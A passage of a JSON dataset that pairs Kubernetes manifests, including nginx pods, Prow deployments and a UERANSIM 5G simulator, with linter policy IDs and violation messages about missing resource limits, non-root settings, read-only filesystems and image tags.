    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7049",
    "manifest_path": "data/manifests/the_stack_sample/sample_2564.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-619\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7050",
    "manifest_path": "data/manifests/the_stack_sample/sample_2565.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4556\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7051",
    "manifest_path": "data/manifests/the_stack_sample/sample_2565.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4556\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7052",
    "manifest_path": "data/manifests/the_stack_sample/sample_2565.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4556\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7053",
    "manifest_path": "data/manifests/the_stack_sample/sample_2565.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4556\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7054",
    "manifest_path": "data/manifests/the_stack_sample/sample_2565.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4556\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7055",
    "manifest_path": "data/manifests/the_stack_sample/sample_2567.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20210504-af1ac03335\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"horologium\" does not have a read-only root file system"
  },
  {
    "id": "7056",
    "manifest_path": "data/manifests/the_stack_sample/sample_2567.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20210504-af1ac03335\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"horologium\" not found"
  },
  {
    "id": "7057",
    "manifest_path": "data/manifests/the_stack_sample/sample_2567.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20210504-af1ac03335\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"horologium\" is not set to runAsNonRoot"
  },
  {
    "id": "7058",
    "manifest_path": "data/manifests/the_stack_sample/sample_2567.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20210504-af1ac03335\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"horologium\" has cpu request 0"
  },
  {
    "id": "7059",
    "manifest_path": "data/manifests/the_stack_sample/sample_2567.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20210504-af1ac03335\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"horologium\" has memory limit 0"
  },
  {
    "id": "7060",
    "manifest_path": "data/manifests/the_stack_sample/sample_2568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200325-b114fe7f2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "7061",
    "manifest_path": "data/manifests/the_stack_sample/sample_2568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200325-b114fe7f2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7062",
    "manifest_path": "data/manifests/the_stack_sample/sample_2568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200325-b114fe7f2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "7063",
    "manifest_path": "data/manifests/the_stack_sample/sample_2568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200325-b114fe7f2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "7064",
    "manifest_path": "data/manifests/the_stack_sample/sample_2568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200325-b114fe7f2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "7065",
    "manifest_path": "data/manifests/the_stack_sample/sample_2568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200325-b114fe7f2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "7066",
    "manifest_path": "data/manifests/the_stack_sample/sample_2568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200325-b114fe7f2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "7067",
    "manifest_path": "data/manifests/the_stack_sample/sample_2568.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200325-b114fe7f2\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "7068",
    "manifest_path": "data/manifests/the_stack_sample/sample_2570.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: aws\n  name: rds-discovery\nspec:\n  containers:\n  - name: rds-discovery-skaffold\n    image: docker.openraven.io/open/aws-discovery:latest\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 80\n    env:\n    - name: SPRING_PROFILES_ACTIVE\n      value: default,prod,producer,RDS\n    - name: GREMLIN_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: odb-orientdb-secret\n          key: root-password\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"rds-discovery-skaffold\" is using an invalid container image, \"docker.openraven.io/open/aws-discovery:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7069",
    "manifest_path": "data/manifests/the_stack_sample/sample_2570.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: aws\n  name: rds-discovery\nspec:\n  containers:\n  - name: rds-discovery-skaffold\n    image: docker.openraven.io/open/aws-discovery:latest\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 80\n    env:\n    - name: SPRING_PROFILES_ACTIVE\n      value: default,prod,producer,RDS\n    - name: GREMLIN_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: odb-orientdb-secret\n          key: root-password\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rds-discovery-skaffold\" does not have a read-only root file system"
  },
  {
    "id": "7070",
    "manifest_path": "data/manifests/the_stack_sample/sample_2570.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: aws\n  name: rds-discovery\nspec:\n  containers:\n  - name: rds-discovery-skaffold\n    image: docker.openraven.io/open/aws-discovery:latest\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 80\n    env:\n    - name: SPRING_PROFILES_ACTIVE\n      value: default,prod,producer,RDS\n    - name: GREMLIN_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: odb-orientdb-secret\n          key: root-password\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rds-discovery-skaffold\" is not set to runAsNonRoot"
  },
  {
    "id": "7071",
    "manifest_path": "data/manifests/the_stack_sample/sample_2570.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: aws\n  name: rds-discovery\nspec:\n  containers:\n  - name: rds-discovery-skaffold\n    image: docker.openraven.io/open/aws-discovery:latest\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 80\n    env:\n    - name: SPRING_PROFILES_ACTIVE\n      value: default,prod,producer,RDS\n    - name: GREMLIN_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: odb-orientdb-secret\n          key: root-password\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rds-discovery-skaffold\" has cpu request 0"
  },
  {
    "id": "7072",
    "manifest_path": "data/manifests/the_stack_sample/sample_2570.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: aws\n  name: rds-discovery\nspec:\n  containers:\n  - name: rds-discovery-skaffold\n    image: docker.openraven.io/open/aws-discovery:latest\n    imagePullPolicy: Always\n    ports:\n    - containerPort: 80\n    env:\n    - name: SPRING_PROFILES_ACTIVE\n      value: default,prod,producer,RDS\n    - name: GREMLIN_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: odb-orientdb-secret\n          key: root-password\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rds-discovery-skaffold\" has memory limit 0"
  },
  {
    "id": "7073",
    "manifest_path": "data/manifests/the_stack_sample/sample_2571.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: poc5\n  labels:\n    app: poc5\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    targetPort: 8081\n    protocol: TCP\n    name: http\n  selector:\n    app: poc5\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:poc5])"
  },
  {
    "id": "7074",
    "manifest_path": "data/manifests/the_stack_sample/sample_2576.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ueransim-gnb-deployment\n  labels:\n    app: ueransim-gnb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ueransim-gnb\n  template:\n    metadata:\n      labels:\n        app: ueransim-gnb\n    spec:\n      containers:\n      - name: ueransim-gnb\n        imagePullPolicy: IfNotPresent\n        image: free5gmano/ueransim:v3.1.4\n        securityContext:\n          privileged: true\n        command:\n        - /bin/bash\n        - -c\n        args:\n        - ./build/nr-gnb -c ./config/open5gs-gnb.yaml\n        volumeMounts:\n        - name: gnb-conf\n          mountPath: /UERANSIM/config/open5gs-gnb.yaml\n          subPath: open5gs-gnb.yaml\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.18/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: gnb-conf\n        configMap:\n          name: ueransim-configmap\n          items:\n          - key: open5gs-gnb.yaml\n            path: open5gs-gnb.yaml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-network-client\" does not have a read-only root file system"
  },
  {
    "id": "7075",
    "manifest_path": "data/manifests/the_stack_sample/sample_2576.yaml",
